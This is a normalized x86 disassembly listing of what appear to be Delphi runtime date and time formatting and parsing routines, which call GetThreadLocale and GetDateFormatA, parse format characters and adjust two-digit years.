mov eax [ ebp + 0x8 ]
add eax 0xfffffff2
call sub_409600
mov eax [ ebp + 0x8 ]
mov [ eax - 0x13 ] 0x1
sub_409770
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1d ] 0x0
jne r-xdata
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
add eax 0xffffffe4
push eax
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x1a ]
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x18 ]
mov eax [ ebp + 0x8 ]
add eax 0xffffffea
call sub_409354
mov eax [ ebp + 0x8 ]
mov [ eax - 0x1d ] 0x1
sub_4097b0
push ebp
mov ebp esp
add esp 0xfffffee8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x118 ] ecx
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_4098fe
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_403e78
mov eax [ ebp + 0x8 ]
mov ax [ eax - 0xe ]
mov [ ebp - 0x14 ] ax
mov eax [ ebp + 0x8 ]
mov ax [ eax - 0x10 ]
mov [ ebp - 0x12 ] ax
mov eax [ ebp + 0x8 ]
mov ax [ eax - 0x12 ]
mov [ ebp - 0xe ] ax
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_403f10
push 0x100
lea eax [ ebp - 0x114 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_404338
push eax
lea eax [ ebp - 0x14 ]
push eax
push 0x4
call GetThreadLocale
push eax
call GetDateFormatA
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_409905
lea eax [ ebp - 0x118 ]
call sub_403e78
lea eax [ ebp - 0x4 ]
call sub_403e78
retn
mov eax ebx
lea edx [ ebp - 0x114 ]
mov ecx 0x100
call sub_4040e8
dec esi
jne r-xdata
mov eax [ rw-data ]
sub eax 0x4
je r-xdata
cmp [ rw-data ] 0x1
jne r-xdata
sub eax 0xd
jne r-xdata
mov eax [ ebx ]
call sub_404138
mov edx eax
mov eax [ ebx ]
call sub_40bcf4
cmp eax 0x4
jne r-xdata
push ebx
mov eax [ ebx ]
mov edx 0x1
call sub_40be68
mov ecx eax
mov eax [ ebx ]
mov edx 0x1
call sub_404398
jmp r-xdata
mov eax [ ebx ]
mov edx 0x3
call sub_40be04
mov esi eax
lea eax [ ebp - 0x114 ]
add esi eax
dec esi
lea eax [ ebp - 0x118 ]
mov edx esi
call sub_404070
mov eax [ ebp - 0x118 ]
mov edx 0x2
call sub_40be68
mov ecx eax
mov eax ebx
mov edx esi
call sub_403f68
sub_409918
push ebp
mov ebp esp
add esp 0xfffffeec
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_4099f6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_403e78
mov eax [ ebp + 0x8 ]
mov ax [ eax - 0xe ]
mov [ ebp - 0x14 ] ax
mov eax [ ebp + 0x8 ]
mov ax [ eax - 0x10 ]
mov [ ebp - 0x12 ] ax
mov eax [ ebp + 0x8 ]
mov ax [ eax - 0x12 ]
mov [ ebp - 0xe ] ax
cmp esi 0x2
jg r-xdata
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_403f10
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_403f10
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4099fd
lea eax [ ebp - 0x4 ]
call sub_403e78
retn
mov eax ebx
lea edx [ ebp - 0x114 ]
mov ecx 0x100
call sub_4040e8
dec esi
jne r-xdata
push 0x100
lea eax [ ebp - 0x114 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_404338
push eax
lea eax [ ebp - 0x14 ]
push eax
push 0x4
call GetThreadLocale
push eax
call GetDateFormatA
test eax eax
je r-xdata
mov eax [ ebx ]
cmp [ eax ] 0x30
jne r-xdata
push ebx
mov eax [ ebx ]
call sub_404138
mov ecx eax
dec ecx
mov eax [ ebx ]
mov edx 0x2
call sub_404398
sub_409a20
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
xor edx edx
mov [ ebp - 0x28 ] edx
mov [ ebp - 0x24 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_40a1a1
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40a1a8
lea eax [ ebp - 0x28 ]
mov edx 0x2
call sub_403e9c
retn
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x108 ] 0x2
jge r-xdata
mov eax [ ebp + 0x8 ]
inc [ eax - 0x108 ]
mov bl 0x20
mov [ ebp - 0x13 ] 0x0
mov [ ebp - 0x1d ] 0x0
mov [ ebp - 0x1e ] 0x0
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax ]
test al al
jne r-xdata
mov [ ebp - 0x5 ] al
mov al [ ebp - 0x5 ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x108 ]
mov eax [ ebp - 0x4 ]
call sub_40bee8
mov [ ebp - 0x4 ] eax
mov al [ ebp - 0x5 ]
mov edx eax
add dl 0x9f
sub dl 0x1a
jae r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_40bec8
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_40965c
pop ecx
mov eax [ ebp - 0x4 ]
call sub_40bee8
mov [ ebp - 0x4 ] eax
mov bl 0x20
jmp r-xdata
mov edx eax
add dl 0xbf
sub dl 0x1a
jae r-xdata
sub al 0x20
and eax 0xff
add eax 0xffffffde
cmp eax 0x38
ja r-xdata
cmp al 0x4d
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x5 ]
mov edx 0x1
call sub_40965c
pop ecx
mov al [ eax + lookup_table_409b03 ]
jmp [ eax * 4 + jump_table_409b3c ]
mov ebx eax
cmp bl 0x48
jne r-xdata
push ebp
call sub_40970c
pop ecx
push ebp
call sub_409738
pop ecx
cmp [ ebp - 0xc ] 0x2
jg r-xdata
push ebp
call sub_40970c
pop ecx
push ebp
call sub_409738
pop ecx
mov eax [ ebp + 0x8 ]
push eax
push ebp
lea edx [ ebp - 0x24 ]
mov eax [ ebp - 0xc ]
call sub_4097b0
pop ecx
mov eax [ ebp - 0x24 ]
call sub_4096a0
pop ecx
jmp r-xdata
push ebp
call sub_40970c
pop ecx
push ebp
call sub_409738
pop ecx
mov eax [ ebp + 0x8 ]
push eax
push ebp
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0xc ]
call sub_409918
pop ecx
mov eax [ ebp - 0x28 ]
call sub_4096a0
pop ecx
jmp r-xdata
push ebp
call sub_40970c
pop ecx
push ebp
call sub_409738
pop ecx
mov eax [ ebp - 0xc ]
dec eax
sub eax 0x2
jb r-xdata
push ebp
call sub_40970c
pop ecx
mov eax [ ebp - 0xc ]
dec eax
sub eax 0x2
jb r-xdata
push ebp
call sub_40970c
pop ecx
push ebp
call sub_409770
pop ecx
mov [ ebp - 0x1f ] 0x0
mov esi [ ebp - 0x4 ]
jmp r-xdata
push ebp
call sub_40970c
pop ecx
push ebp
call sub_409770
pop ecx
cmp [ ebp - 0xc ] 0x2
jle r-xdata
push ebp
call sub_40970c
pop ecx
push ebp
call sub_409770
pop ecx
cmp [ ebp - 0xc ] 0x2
jle r-xdata
push ebp
call sub_40970c
pop ecx
cmp [ ebp - 0xc ] 0x1
jne r-xdata
push ebp
call sub_40970c
pop ecx
push ebp
call sub_409770
pop ecx
cmp [ ebp - 0xc ] 0x3
jle r-xdata
push ebp
call sub_409770
pop ecx
mov esi [ ebp - 0x4 ]
dec esi
mov edx r-xdata
mov ecx 0x5
mov eax esi
call sub_4084fc
test eax eax
jne r-xdata
push ebp
call sub_40970c
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_409a20
pop ecx
push ebp
call sub_409770
pop ecx
cmp [ ebp - 0x16 ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov esi [ ebp - 0x4 ]
jmp r-xdata
mov al 0x4e
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0xe ]
mov edx 0x4
call sub_4096c0
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0xe ]
mov ecx 0x64
xor edx edx
div ecx
mov eax edx
mov edx 0x2
call sub_4096c0
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
call sub_4096c0
pop ecx
jmp r-xdata
je r-xdata
push ebp
call sub_409738
pop ecx
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x12 ]
mov edx [ ebp - 0xc ]
call sub_4096c0
pop ecx
jmp r-xdata
je r-xdata
mov al [ esi ]
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x18 ]
mov edx [ ebp - 0xc ]
call sub_4096c0
pop ecx
jmp r-xdata
mov [ ebp - 0xc ] 0x2
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x1a ]
mov edx [ ebp - 0xc ]
call sub_4096c0
pop ecx
jmp r-xdata
mov [ ebp - 0xc ] 0x2
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_409a20
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_409a20
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x1c ]
mov edx [ ebp - 0xc ]
call sub_4096c0
pop ecx
jmp r-xdata
mov [ ebp - 0xc ] 0x3
mov edx r-xdata
mov ecx 0x3
mov eax esi
call sub_4084fc
test eax eax
jne r-xdata
cmp [ ebp - 0x16 ] 0xc
jb r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax r-xdata
mov edx 0x1
call sub_40965c
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_409a20
pop ecx
jmp r-xdata
cmp [ ebp - 0x18 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax rw-data
mov edx 0x1
call sub_40965c
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax rw-data
mov edx 0x1
call sub_40965c
pop ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax ]
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x10 ]
mov eax [ eax * 4 + rw-data ]
call sub_4096a0
pop ecx
jmp r-xdata
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
call sub_409620
movzx eax ax
mov eax [ eax * 4 + rw-data ]
call sub_4096a0
pop ecx
jmp r-xdata
dec eax
je r-xdata
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
mov ax [ ebp - 0x16 ]
cmp [ ebp - 0x1e ] 0x0
je r-xdata
mov edx r-xdata
mov ecx 0x4
mov eax esi
call sub_4084fc
test eax eax
jne r-xdata
cmp [ ebp - 0x16 ] 0xc
jb r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov edx 0x2
mov eax esi
call sub_40965c
pop ecx
add [ ebp - 0x4 ] 0x4
mov [ ebp - 0x1e ] 0x1
jmp r-xdata
add esi 0x3
cmp [ ebp - 0x1a ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov edx [ ebp - 0x4 ]
sub edx esi
mov eax esi
call sub_40965c
pop ecx
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x0
je r-xdata
cmp al [ ebp - 0x5 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x10 ]
mov eax [ eax * 4 + rw-data ]
call sub_4096a0
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
call sub_409620
movzx eax ax
mov eax [ eax * 4 + rw-data ]
call sub_4096a0
pop ecx
jmp r-xdata
dec eax
je r-xdata
xor eax eax
mov al [ esi ]
cmp eax 0x48
jg r-xdata
mov eax esi
call sub_40bee8
mov esi eax
jmp r-xdata
cmp [ ebp - 0xc ] 0x2
jle r-xdata
test ax ax
jne r-xdata
mov edx r-xdata
mov ecx 0x4
mov eax esi
call sub_4084fc
test eax eax
jne r-xdata
cmp [ ebp - 0x16 ] 0xc
jae r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov edx 0x1
mov eax esi
call sub_40965c
pop ecx
add [ ebp - 0x4 ] 0x2
mov [ ebp - 0x1e ] 0x1
jmp r-xdata
add esi 0x2
inc [ ebp - 0x4 ]
jmp r-xdata
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_409a20
pop ecx
jmp r-xdata
jmp r-xdata
sub eax 0x61
je r-xdata
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
movzx eax ax
mov edx [ ebp - 0xc ]
call sub_4096c0
pop ecx
jmp r-xdata
mov [ ebp - 0xc ] 0x2
cmp ax 0xc
jbe r-xdata
mov ax 0xc
jmp r-xdata
mov edx r-xdata
mov ecx 0x3
mov eax esi
call sub_4084fc
test eax eax
jne r-xdata
push ebp
call sub_409738
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
call sub_409620
movzx eax ax
mov eax [ eax * 4 + rw-data ]
call sub_4096a0
pop ecx
add [ ebp - 0x4 ] 0x3
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_4096a0
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_4096a0
pop ecx
jmp r-xdata
inc [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
call sub_40bee8
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_409a20
pop ecx
jmp r-xdata
cmp [ ebp - 0x1f ] 0x0
jne r-xdata
sub eax 0x7
je r-xdata
sub eax 0x22
je r-xdata
sub ax 0xc
mov eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x5 ]
mov edx 0x1
call sub_40965c
pop ecx
jmp r-xdata
push ebp
call sub_409738
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
call sub_409620
movzx eax ax
mov eax [ eax * 4 + rw-data ]
call sub_4096a0
pop ecx
add [ ebp - 0x4 ] 0x2
jmp r-xdata
add [ ebp - 0x4 ] 0x3
mov [ ebp - 0x1e ] 0x1
jmp r-xdata
inc esi
mov edx r-xdata
mov ecx 0x5
mov eax esi
call sub_4084fc
test eax eax
je r-xdata
jmp r-xdata
mov al [ ebp - 0x1f ]
xor al 0x1
mov [ ebp - 0x1f ] al
sub eax 0x5
je r-xdata
mov [ ebp - 0x1e ] 0x1
jmp r-xdata
mov edx r-xdata
mov ecx 0x3
mov eax esi
call sub_4084fc
test eax eax
je r-xdata
sub eax 0x1a
je r-xdata
mov edx r-xdata
mov ecx 0x4
mov eax esi
call sub_4084fc
test eax eax
jne r-xdata
jmp r-xdata
sub_40a1d4
push ebp
mov ebp esp
add esp 0xfffffef8
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
mov [ ebp - 0x104 ] eax
xor eax eax
mov [ ebp - 0x108 ] eax
test ebx ebx
je r-xdata
push ebp
mov eax r-xdata
call sub_409a20
pop ecx
push ebp
mov eax ebx
call sub_409a20
pop ecx
jmp r-xdata
lea edx [ ebp - 0x100 ]
mov eax esi
mov ecx [ ebp - 0x104 ]
call sub_403f68
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_40a244
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov ebx [ edi ]
jmp r-xdata
mov eax esi
call sub_404138
cmp ebx eax
jg r-xdata
mov [ edi ] ebx
pop edi
pop esi
pop ebx
retn
cmp [ esi + ebx - 0x1 ] 0x20
je r-xdata
inc ebx
sub_40a268
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
mov [ ebp - 0x9 ] 0x0
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x0
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_40a244
mov ebx [ ebp - 0x4 ]
mov ebx [ ebx ]
xor esi esi
jmp r-xdata
mov eax edi
call sub_404138
cmp ebx eax
jg r-xdata
mov eax [ ebp - 0x4 ]
cmp ebx [ eax ]
jle r-xdata
mov al [ edi + ebx - 0x1 ]
add al 0xd0
sub al 0xa
jae r-xdata
mov al [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax ebx
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
sub al dl
mov edx [ ebp + 0x8 ]
mov [ edx ] al
mov eax [ ebp - 0x4 ]
mov [ eax ] ebx
mov eax [ ebp - 0x8 ]
mov [ eax ] si
mov [ ebp - 0x9 ] 0x1
cmp si 0x3e8
jb r-xdata
mov eax esi
add eax eax
lea eax [ eax + eax * 4 ]
xor edx edx
mov dl [ edi + ebx - 0x1 ]
sub dx 0x30
add ax dx
mov esi eax
inc ebx
sub_40a2fc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_40a375
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
test edi edi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40a37c
lea eax [ ebp - 0x8 ]
call sub_403e78
retn
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_40a244
lea eax [ ebp - 0x8 ]
push eax
mov eax edi
call sub_404138
mov ecx eax
mov edx [ esi ]
mov eax [ ebp - 0x4 ]
call sub_404398
mov edx [ ebp - 0x8 ]
mov eax edi
call sub_407c1c
test eax eax
jne r-xdata
mov eax edi
call sub_404138
add [ esi ] eax
mov bl 0x1
sub_40a388
push ebx
push esi
push edi
push ecx
mov [ esp ] cl
mov edi edx
mov esi eax
xor ebx ebx
mov edx edi
mov eax esi
call sub_40a244
mov eax esi
call sub_404138
cmp eax [ edi ]
jl r-xdata
mov eax ebx
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ edi ]
mov al [ esi + eax - 0x1 ]
cmp al [ esp ]
jne r-xdata
inc [ edi ]
mov bl 0x1
sub_40a3c0
push ebx
push esi
push edi
mov esi eax
xor ebx ebx
mov edi 0x1
jmp r-xdata
mov eax esi
call sub_404138
cmp edi eax
jle r-xdata
mov al [ esi + edi - 0x1 ]
and al 0xdf
sub al 0x44
je r-xdata
xor ebx ebx
mov bl 0x1
jmp r-xdata
dec al
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov bl 0x2
jmp r-xdata
sub al 0x8
je r-xdata
xor ebx ebx
jmp r-xdata
sub al 0xc
je r-xdata
mov bl 0x2
jmp r-xdata
jmp r-xdata
inc edi
sub_40a40c
push ebx
push esi
mov ebx edx
mov esi eax
jmp r-xdata
mov eax esi
call sub_404138
cmp eax [ ebx ]
jl r-xdata
pop esi
pop ebx
retn
mov eax [ ebx ]
mov al [ esi + eax - 0x1 ]
add al 0xd0
sub al 0xa
jae r-xdata
mov eax [ ebx ]
mov al [ esi + eax - 0x1 ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
inc [ ebx ]
mov edx [ ebx ]
mov eax esi
call sub_40bf2c
mov [ ebx ] eax
jmp r-xdata
sub_40a454
push ebx
push esi
push edi
push ebp
push ecx
mov ebp eax
xor eax eax
mov [ esp ] eax
mov edi 0x7
mov ebx rw-data
mov esi rw-data
mov eax [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
call sub_404338
push eax
mov eax [ ebx ]
call sub_404338
pop edx
call sub_40c02c
test eax eax
je r-xdata
add esi 0x4
add ebx 0x4
dec edi
jne r-xdata
mov eax [ esi ]
mov [ esp ] eax
jmp r-xdata
cmp [ ebx ] 0x0
je r-xdata
sub_40a4a8
push ebp
mov ebp esp
push ebx
mov ebx eax
cmp [ rw-data ] 0x12
jne r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x4 ]
cmp ebx 0x63
jg r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0x0
jle r-xdata
call sub_409648
movzx ecx ax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cdq
xor eax edx
sub eax edx
add ecx eax
mov eax ecx
mov ecx 0x64
cdq
idiv ecx
imul eax eax 0x64
add ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add eax ebx
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
neg [ eax - 0x4 ]
jmp r-xdata
sub_40a504
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x28 ] ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_40a81f
push [ fs : eax ]
mov [ fs : eax ] esp
xor edi edi
mov [ ebp - 0x12 ] 0x0
mov [ ebp - 0x14 ] 0x0
mov [ ebp - 0x18 ] 0x0
mov [ ebp - 0x9 ] 0x0
mov eax [ rw-data ]
call sub_40a3c0
mov [ ebp - 0xa ] al
xor eax eax
mov [ ebp - 0x4 ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov edx [ rw-data ]
mov eax r-xdata
call sub_40bf68
test eax eax
jle r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x67
jne r-xdata
lea eax [ ebp - 0x15 ]
push eax
lea ecx [ ebp - 0xc ]
mov edx ebx
mov eax esi
call sub_40a268
test al al
je r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x4 ] eax
mov edx ebx
mov eax esi
call sub_40a40c
lea eax [ ebp - 0x20 ]
push eax
mov ecx [ ebx ]
dec ecx
mov edx 0x1
mov eax esi
call sub_404398
mov eax [ ebp - 0x20 ]
lea edx [ ebp - 0x1c ]
call sub_407c8c
mov eax [ ebp - 0x1c ]
call sub_40a454
mov [ ebp - 0x4 ] eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40a826
lea eax [ ebp - 0x28 ]
mov edx 0x4
call sub_403e9c
retn
mov edx ebx
mov cl [ rw-data ]
mov eax esi
call sub_40a388
test al al
je r-xdata
lea eax [ ebp - 0x16 ]
push eax
lea ecx [ ebp - 0xe ]
mov edx ebx
mov eax esi
call sub_40a268
test al al
je r-xdata
mov edx ebx
mov cl [ rw-data ]
mov eax esi
call sub_40a388
test al al
je r-xdata
call sub_409648
mov edi eax
cmp [ ebp - 0xa ] 0x1
jne r-xdata
lea eax [ ebp - 0x17 ]
push eax
lea ecx [ ebp - 0x10 ]
mov edx ebx
mov eax esi
call sub_40a268
test al al
je r-xdata
mov ax [ ebp - 0xc ]
mov [ ebp - 0x12 ] ax
mov ax [ ebp - 0xe ]
mov [ ebp - 0x14 ] ax
mov ax [ ebp - 0xc ]
mov [ ebp - 0x14 ] ax
mov ax [ ebp - 0xe ]
mov [ ebp - 0x12 ] ax
jmp r-xdata
mov al [ ebp - 0xa ]
sub al 0x1
jb r-xdata
mov eax [ ebp - 0x8 ]
push eax
mov cx [ ebp - 0x14 ]
mov dx [ ebp - 0x12 ]
mov eax edi
call sub_4093ec
mov [ ebp - 0x9 ] al
mov edx [ rw-data ]
mov eax r-xdata
call sub_40447c
test eax eax
je r-xdata
mov edx ebx
mov cl [ rw-data ]
mov eax esi
call sub_40a388
mov edx ebx
mov eax esi
call sub_40a244
cmp [ rw-data ] 0x0
je r-xdata
mov di [ ebp - 0x10 ]
mov al [ ebp - 0x17 ]
mov [ ebp - 0x18 ] al
mov ax [ ebp - 0xc ]
mov [ ebp - 0x12 ] ax
mov ax [ ebp - 0xe ]
mov [ ebp - 0x14 ] ax
jmp r-xdata
je r-xdata
mov eax [ rw-data ]
mov al [ eax ]
add al 0xd0
sub al 0xa
jae r-xdata
cmp [ ebp - 0x4 ] 0x0
jle r-xdata
mov di [ ebp - 0x10 ]
mov al [ ebp - 0x17 ]
mov [ ebp - 0x18 ] al
mov ax [ ebp - 0xe ]
mov [ ebp - 0x12 ] ax
mov ax [ ebp - 0xc ]
mov [ ebp - 0x14 ] ax
jmp r-xdata
dec al
je r-xdata
mov eax esi
call sub_404138
cmp eax [ ebx ]
jl r-xdata
mov edx ebx
mov eax esi
call sub_40a40c
jmp r-xdata
cmp [ ebp - 0x18 ] 0x2
ja r-xdata
push ebp
movzx eax di
call sub_40a4a8
pop ecx
mov edi eax
jmp r-xdata
mov di [ ebp - 0xc ]
mov al [ ebp - 0x15 ]
mov [ ebp - 0x18 ] al
mov ax [ ebp - 0xe ]
mov [ ebp - 0x12 ] ax
mov ax [ ebp - 0x10 ]
mov [ ebp - 0x14 ] ax
jmp r-xdata
mov edx ebx
mov eax esi
call sub_40a244
mov eax esi
call sub_404138
cmp eax [ ebx ]
jl r-xdata
mov eax [ ebx ]
cmp [ esi + eax - 0x1 ] 0x20
jne r-xdata
call sub_409648
movzx ecx ax
movzx eax [ rw-data ]
sub ecx eax
mov eax ecx
push ecx
mov ecx 0x64
cdq
idiv ecx
pop ecx
imul ax ax 0x64
add di ax
cmp [ rw-data ] 0x0
jbe r-xdata
lea eax [ ebp - 0x24 ]
push eax
mov eax [ rw-data ]
call sub_404138
mov ecx eax
mov edx [ ebx ]
mov eax esi
call sub_404398
mov edx [ ebp - 0x24 ]
mov eax [ rw-data ]
call sub_407c1c
test eax eax
je r-xdata
inc [ ebx ]
movzx eax di
cmp ecx eax
jle r-xdata
lea eax [ ebp - 0x28 ]
push eax
mov eax [ rw-data ]
call sub_404138
mov ecx eax
mov edx [ ebx ]
mov eax esi
call sub_404398
mov edx [ ebp - 0x28 ]
mov eax [ rw-data ]
call sub_407c1c
test eax eax
jne r-xdata
add di 0x64
jmp r-xdata
sub_40a848
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov [ esp ] ecx
mov esi edx
mov ebp eax
xor ebx ebx
or edi 0xffffffff
mov edx esi
mov ecx [ rw-data ]
mov eax ebp
call sub_40a2fc
test al al
jne r-xdata
xor edi edi
jmp r-xdata
mov edx esi
mov ecx r-xdata
mov eax ebp
call sub_40a2fc
test al al
je r-xdata
test edi edi
jl r-xdata
mov edx esi
mov ecx [ rw-data ]
mov eax ebp
call sub_40a2fc
test al al
jne r-xdata
lea eax [ esp + 0xc ]
push eax
lea ecx [ esp + 0x8 ]
mov edx esi
mov eax ebp
call sub_40a268
test al al
je r-xdata
mov edx esi
mov eax ebp
call sub_40a244
mov edi 0xc
mov edx esi
mov ecx r-xdata
mov eax ebp
call sub_40a2fc
test al al
je r-xdata
mov eax ebx
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
mov [ esp + 0x6 ] 0x0
mov [ esp + 0x8 ] 0x0
mov [ esp + 0xa ] 0x0
mov edx esi
mov cl [ rw-data ]
mov eax ebp
call sub_40a388
test al al
je r-xdata
test edi edi
jge r-xdata
lea eax [ esp + 0xc ]
push eax
lea ecx [ esp + 0xa ]
mov edx esi
mov eax ebp
call sub_40a268
test al al
je r-xdata
test edi edi
jl r-xdata
mov edx esi
mov ecx [ rw-data ]
mov eax ebp
call sub_40a2fc
test al al
jne r-xdata
mov edx esi
mov cl [ rw-data ]
mov eax ebp
call sub_40a388
test al al
je r-xdata
mov edx esi
mov eax ebp
call sub_40a244
mov ax [ esp + 0xa ]
push eax
mov eax [ esp + 0x4 ]
push eax
mov cx [ esp + 0x10 ]
mov dx [ esp + 0xe ]
mov ax [ esp + 0xc ]
call sub_4092e4
mov ebx eax
cmp [ esp + 0x4 ] 0x0
je r-xdata
xor edi edi
jmp r-xdata
mov edx esi
mov ecx r-xdata
mov eax ebp
call sub_40a2fc
test al al
je r-xdata
lea eax [ esp + 0xc ]
push eax
lea ecx [ esp + 0xc ]
mov edx esi
mov eax ebp
call sub_40a268
test al al
je r-xdata
cmp [ esp + 0x4 ] 0xc
ja r-xdata
mov edx esi
mov ecx [ rw-data ]
mov eax ebp
call sub_40a2fc
test al al
jne r-xdata
mov edx esi
mov cl [ rw-data ]
mov eax ebp
call sub_40a388
test al al
je r-xdata
cmp [ esp + 0x4 ] 0xc
jne r-xdata
mov edi 0xc
mov edx esi
mov ecx r-xdata
mov eax ebp
call sub_40a2fc
test al al
je r-xdata
lea eax [ esp + 0xc ]
push eax
lea ecx [ esp + 0xe ]
mov edx esi
mov eax ebp
call sub_40a268
test al al
je r-xdata
add [ esp + 0x4 ] di
